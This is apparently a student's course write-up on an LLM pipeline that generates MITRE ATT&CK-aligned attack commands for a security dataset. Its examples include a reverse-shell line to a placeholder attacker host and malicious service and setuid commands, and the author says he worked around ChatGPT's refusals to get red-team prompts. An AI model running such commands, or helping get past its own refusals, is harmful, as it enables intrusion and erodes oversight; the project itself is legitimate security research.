---
title: "Automated MITRE ATT&CK Command Generation Pipeline"
date: 2025-12-13
categories: [project-writeups]
tags: [mitre, llm, rag, security, python]
---

# Automated MITRE ATT&CK Command Generation Pipeline

**Course:** CSE 132 – Computer Security

**Name:** Stanley Good

**Date:** December 12th 2025

## Introduction

This project was completed as the final assignment for CSE 132. The goal of this project was to build an automated pipeline that generated commands aligned with the MITRE ATT&CK Framework.

My initial approach to this project was prompting a large language model to generate commands directly from a technique name or ID. This generated commands that looked plausible but did not fulfill the diversity and uniqueness requirements of the assignment. The model tended to reuse the same commands, confuse techniques, or produce output that were similar to the technique but not directly aligned. These problems became more obvious as I tried to scale the generation process because it was producing large batches of the same commands with minor changes like different flags.

Due to these repeated issues, I moved away from a single prompt approach decided to have multiple stages in my pipeline. Each stage of the pipeline would handle only one specific aspect of the command generation. This ensured that each LLM was constrained to a smaller role which improved overall output quality.

## MITRE Background and Sub-technique scope

MITRE ATT&CK categorizes adversary behavior into tactics and techniques based on real world observations. A tactic represents an attacker’s objective, while techniques and sub-techniques describe specific ways that objective is achieved. For this project, I focused on a curated set of sub-techniques across multiple tactics, including Execution, Persistence, Privilege Escalation, Credential Access, Discovery, Lateral Movement, Defense Evasion, and Impact.

To choose which sub-techniques to use I made sure they had to be reasonably demonstrated using command-line driven actions with well defined tooling. By narrowing the scope to sub-techniques that are command-centric and validation-friendly, the pipeline was able to generate outputs that were both more realistic and more clearly aligned with their ATT&CK labels.

## Software Design Choices

### Data Models

I implemented data models such as `Technique`, `Scenario`, and `Command` to keep things consistent and reduce complexity across the pipeline. I was previously passing loosely structured dictionaries between stages and realized I was just remaking the same data structure over and over and running into the same errors. These data models made development
much easier across the pipeline because it made the code much more readable. Also, including these data models helped catch typing bugs much easier because the typing needed to be consistent.

Using structured models also enabled lightweight caching of expensive computations. RAG context and generated scenarios are contained in the `Technique` model so that they can be computed one time, then reused across the pipeline.

### Retrieval-Augmented Generation

I also chose to use Retrieval-augmented generation (RAG) to provide sufficient context of a sub-technique to the LLM models. Without retrieval, many generated commands looked alright but were not really aligned with the intended technique. Retrieving small and relevant pieces of ATT&CK documentation helped ground the models in the same context across stages. Treating retrieval as its own step also made it easier to debug separately from command generation.

## Pipeline Overview

The final system is implemented as a pipeline made up of several high level stages. Each stage takes structured input, performs a specific action, and produces structured output for the next stage. This design made the system more modular and a lot easier to debug.

High level view of pipeline:

* Select a MITRE ATT&CK sub-technique
* Retrieve relevant contextual information about that sub-technique using RAG
* Generate multiple attacker scenarios for that sub-technique (LLM)
* For each scenario generated:
  * Generate a command for that scenario (LLM)
  * Validate the command and either repair minor issues or reject it (LLM)
  * Add that command to a list of rows to be uploaded
* Upload rows to dataset every 50 new rows

## Model Choice and Configuration

I defined the model configuration in `config.py`. The generator and validator are both configured to use the same instruction-tuned model: `meta-llama/Meta-Llama-3-8B-Instruct`. Sampling behavior is controlled with `GEN_TEMPERATURE = 0.3` and `GEN_TOP_P = 0.85` for the Scenario Generator and Command Generator models. The Command Validator model is defined as deterministic model with `temperature` set to 0.

The MITRE technique context is sourced from the HuggingFace dataset `Zainabsa99/mitre_attack`
The Command Dataset context is sourced from the HuggingFace dataset `"bigcode/the-stack-smol"`

### Scenario Generation

To generate multiple scenarios for a given technique I would provide the MITRE context retrieved with RAG and a refined prompt to an LLM model.

The scenario generation prompt was created after early experiments showed that directly passing a technique to the command generator model led to very similar commands for that technique. Even when techniques differed, the model repeatedly produced similarly structured commands.

My initial prompt asked the model to “generate attacker scenarios, given this technique:” but this resulted in vague or overly high-level descriptions that were were not specific enough for the command generation model.

To fix this, the prompt was adjusted to provide a specific scenario as an attacker objective and mechanism, instead of a narrative or explanation. The model was instructed to describe what exactly the attacker is trying to achieve and how they achieve it. I had to also exclude specific tooling or flags in scenarios because it caused later stages to converge on the same commands again.

This module caused the most amount of issues because the entire pipeline relied on the strength of these scenarios. I added additional constraints after seeing that scenarios tended to drift outside the intended platform or tactic. OS hints were made explicit, and objectives were grounded using a tactic specific objective taxonomy. This helped eliminate scenarios that were technically valid but misaligned with the technique (for example, Linux-style persistence mechanisms for Windows-only techniques).

#### Command Diversity

During development, output quality was evaluated using qualitative checks instead of formal metrics. Early runs of the pipeline were inspected manually to identify failure patterns such as repeated command structures, similar command structure across scenarios, or commands that differed only by small flag changes. These issues were especially noticeable when generating larger batches.

To assess whether changes improved diversity, I compared batches generated before and after major pipeline updates through manual inspection. Improvements were judged based on whether commands for the same sub-technique differed meaningfully in execution approach or tooling usage rather than superficial syntactic variation.

I noticed that most of the command diversity bottleneck came from the scenario generation model and not the command generation model. The main issue with the command generation model came from structuring the commands similar no matter the technique or scenario given. But once I could have the command generator create a command based on the scenario, I saw that the scenario generator was the main reason why my commands were not diverse.

The scenarios that were generating kept following the same structure of downloading a script and executing it, slightly tailoring it to given technique. After many different rules implemented in the prompt, I achieved improved command diversity through these main components in the table below:

#### Scenario Generation Prompt Structure

| Prompt Component | Why This Was Included |
|------------------|-----------------------|
| MITRE technique context | Provides the correct sub-technique description so scenarios stay aligned with the intended attacker behavior. |
| Structured scenario format (objective, method, OS) | Ensures each scenario describes a clear attacker goal and how it is achieved, making it easy to translate into a command. |
| Meaningful attacker action requirement | Prevents vague or trivial scenarios by requiring a concrete attacker behavior that demonstrates the technique. |
| Operating system restriction | Prevents scenarios from describing actions that do not apply to the specified platform. |
| Tactic-based objective limits | Keeps scenario objectives consistent with the technique’s tactic, such as execution versus persistence. |
| No tool names in scenarios | Prevents scenarios from locking into specific commands or flags too early, which helps preserve diversity later. |
| Fixed number of scenarios | Ensures a consistent number of scenarios are generated for each technique, simplifying batching and processing. |
| Higher creativity for scenarios | Allows varied attacker goals while still staying within strict constraints. |

### Command Generation

To generate commands based on a given scenario, I provided the same MITRE context using RAG around that technique and a different refined prompt to an LLM model.

My initial command generation prompt asked the model to generate a “realistic command” for a given technique. This approach failed consistently because the model would include multiple commands, explanations, and extra text which usually broke my JSON parser and led to more issues downstream.

To fix this, the prompt was redesigned around a strict output contract. The model was told it had exactly one job: translate a single attacker scenario into one concrete command and output it as a single JSON object, with no additional text. I provided very strict formatting rules in the output which made sure the output followed the `Command` structure.

Another major issue the model producing commands that were close, but did not clearly demonstrate the intended MITRE technique. I adressed this by anchoring the prompt to the scenario it was given and the technique definition. The command must demonstrate the specific MITRE technique and directly interact with technique defining artifacts. By forcing a direct translation and requiring technique defining behavior, the improved prompt significantly improved on technique specific commands that followed the intent of the scenario.

#### Command Generation Prompt Structure

| Prompt Component | Why This Was Included |
|------------------|-----------------------|
| Single-command JSON output | Forces the model to return exactly one command in a structured format that is easy to parse and validate. |
| Scenario-to-command requirement | Ensures the command directly implements the given scenario without adding extra actions. |
| Technique-specific starting tool | Prevents generic system commands by requiring a tool that demonstrates the intended MITRE sub-technique. |
| Meaningful command behavior | Ensures the command performs a real action related to the technique rather than a harmless or informational command. |
| Operating system awareness | Prevents commands from using tools or syntax that do not exist on the specified operating system. |
| No extra behavior allowed | Stops the model from combining multiple attacker actions into a single command. |
| Low randomness settings | Reduces variation so commands are consistent, reproducible, and focused on correctness. |
| Translation-focused behavior | Ensures the model converts scenarios into commands rather than inventing new actions. |

### Command Validation

The validation module was much smaller than the previous two because I wanted it to handle a very specific task. I added the validation module to ensure that the commands generated were plausible and had valid syntax. I provided this model command specific context using RAG, and a specialized prompt for validating commands.

Its only purpose is to take a candidate command and determine whether the command is syntactically valid, OS-appropriate, and aligned with the intended MITRE sub-technique. The validator does not introduce new behavior or redesign commands. Instead, it operates under strict constraints to preserve the original intent of the generated output.

The validator is allowed to make only a limited set of changes. These include:

* Fixing syntax errors
* Correcting OS specific tool mismatches
* Repairing broken quoting or escaping
* Adding missing but required flags
* Replacing obvious placeholders with realistic values
* Blocking duplicates

The core functionality of the command must remain unchanged. These include preserving the same tool, the same execution mechanism, and the same attacker intent. If a command cannot be corrected within these constraints, it is rejected rather than rewritten. Rather than performing execution analysis the validator enforces correctness through strict prompt constraints and rejection rules.

I used the command validation model as a filter for pruning out bad commands for my dataset. The pipeline intentionally blocks commands that cannot be corrected within strict constraints. This approach prioritizes dataset correctness and only populates my dataset with quality commands.

#### Command Validation Prompt Structure

| Prompt Component | Why This Was Included |
|------------------|-----------------------|
| Clearly limited validator role | Prevents the validator from generating new commands or changing the original attacker behavior. |
| Allowed-fix list | Limits corrections to small, safe changes like syntax fixes, quoting repairs, or OS mismatches. |
| Technique correctness check | Ensures the command still demonstrates the intended MITRE sub-technique after validation. |
| Operating system compatibility check | Catches invalid tools or syntax that do not match the target operating system. |
| Duplicate command blocking | Prevents repeated commands from inflating the dataset or reducing diversity. |
| Rejection instead of forced fixes | Ensures low-quality or misleading commands are removed rather than rewritten incorrectly. |
| Preserve original command intent | Guarantees validated commands keep the same tool, execution method, and attacker goal. |
| Consistent validation behavior | Uses deterministic settings so validation decisions are repeatable. |

## Working with Large Language Models

One of the main challenges in this project was handling the unpredictability of large language model outputs. The pipeline was very reliant on the quality of LLMs so the unpredictability made it very difficult to make incremental steps. Early versions of the pipeline frequently failed due to excessive verbosity, malformed JSON outputs, or the model producing multiple commands instead of one. To address this issue, all LLM-facing stages were built around strict output contracts that required a single JSON object with a predefined structure. Outputs that violated this contract were either minimally repaired or removed. This made handling the pipeline easier becuase it allowed each LLM to have a consistent input so I only had to focus on the output.

Even with strict prompting, malformed outputs still occurred somehow. I implemented custom JSON recovery logic that can extract complete JSON objects from partially malformed or verbose model outputs. This allowed the pipeline to salvage valid generations that would have been discarded. This allowed my pipeline to run more efficiently because I was able to produce more commands while reducing amount of wasted computation time spent on generating unparsable commands.

Sampling configuration also played an important role in output quality. Scenario generation and command generation benefited from higher variability to encourage diverse attacker objectives, while validation used lower temperature settings to reduce randomness and improve consistency.

Model calls were also batched where possible to reduce computation time, but having a pipeline with 3 LLMs called sequentially will take a long time regardless.

## Commands Exploration

1. **T1548.001 — Abuse Elevation Control Mechanism: Sudo**  
   **Command:** `chmod 4777 /path/to/malicious/binary`  
   **Description:** Sets the set-UID bit on a binary to enable elevated execution privileges on Unix/Linux systems. This reflects a meaningful privilege escalation action consistent with the MITRE technique.

2. **T1543.003 — Create or Modify System Process: Windows Service**  
   **Command:** `sc.exe create <service_name> binPath= <malicious_payload> start= auto`  
   **Description:** Creates a Windows service to run a malicious payload at startup. This demonstrates a persistence mechanism using native service creation tools.

3. **T1068 — Exploitation for Privilege Escalation**  
   **Command:** `powershell -Command "Get-WmiObject -Class Win32_Process -Filter 'Name = 'svchost.exe''"`  
   **Description:** Queries specific running processes to identify potential escalation targets. The filtered WMI query shows intent and technique alignment beyond simple process listing.

4. **T1595 — Active Scanning**  
   **Command:** `nmap -sS -T4 -p- -Pn -n 10.0.0.1`  
   **Description:** Performs an active TCP SYN scan across all ports on a target host to identify exposed network services.

5. **T1021.004 — Remote Services: SSH**  
   **Command:** `ssh user@host 'bash -c "/bin/bash -i > /dev/tcp/attacker_ip/8080 0>&1"'`  
   **Description:** Connects to a remote host and initiates a reverse interactive shell. This demonstrates adversarial lateral movement and remote execution behavior.

## Results

I was pretty happy with the results in my dataset. Most of the commands looked strong and looked like they would run in a real machine. The flags for the commands also check out, even for third party tools like `nmap`. I wish that I had stricter guidelines on having placeholders because those won't be able to run, but I am happy they have the proper structure.

I tried to pick sub-techniques that would produce the highest quality commands for this project while also keeping it diverse. This resulted in me slightly skewing my dataset's diversity and led to less diversity than I would have wanted, despite me randomly sampling those sub-techniques. Although, there is still sufficient diversity across the structure of the commands, even if the techniques are pretty similar.

The results that surprised me the most were seeing how much adding a small change to a prompt can skew the output. I had a rule where it had the mitre command generation model default to a python script if it couldn't produce a relevant command, and it caused every single command to be some sort of python script. The most surprising part about this was seeing how much work it would do just stay within a python script. I saw the LLM jump through hurdles and create complex python scripts to handle simple shell calls instead of just creating a shell script.

## Lessons learned

### Efficiently running the pipeline

My pipeline followed a very sequential approach as shown earlier. This led to many issues in my project because when testing how my pipeline would run across large amounts of data, it would take a very long time to progress a small amount. This led to a lot of wasted time so I figured I had to fix it. After a lot of research, I figured out how to batch LLM calls in my pipeline to be as efficient as possible. Also, caching expensive computations is very helpful becuase that was another bottleneck I encountered.

From this project I learned that setting up your infrastructure early and thinking about how to efficiently run the pipeline from the *beginning* goes a long way. I had to do a lot more code refactors than I would've if I planned out my infrastructure better earlier.

### Crafting prompts that accomplished what I wanted

This was another bottleneck for my progress on this project. It was really difficult to have the LLM actually do what I told it to do, even if I tried to be as explicit and straightforward as possible. What I found worked the best was having another LLM generate the prompt. We learned about this technique in class and it was really fun to see it in action. I used ChatGPT 5.1 to generate the prompts and it made working with the LLM much easier because ChatGPT knew exactly what would communicate to the LLM.

The challenge that came with this approach was having ChatGPT refuse to generate a prompt that would aid red team based command generation. But in order to get ChatGPT to provide the prompts I needed for my pipeline, I had to get pretty good at finding ways to work around its restrictions.

## Dataset

The final output of the pipeline is a dataset of generated commands aligned with MITRE ATT&CK sub-techniques. The dataset contains approximately 513 validated samples and is stored in Parquet format.

Each row includes the generated command under the column name `Command`, along with associated metadata such as technique ID, tactic, operating system, scenario description, and notes.

## Links

* Modal Notebook: [Modal Notebook](https://modal.com/notebooks/nsgood/main/nb-x3yPFldVLQVjX6jue3SH7X)
* HuggingFace Dataset : [Dataset](https://huggingface.co/datasets/nsgood/mitre-attack-command-generation)
* Github Repo: [Github](https://github.com/stanleygvi/MITRE_CMD_GEN)
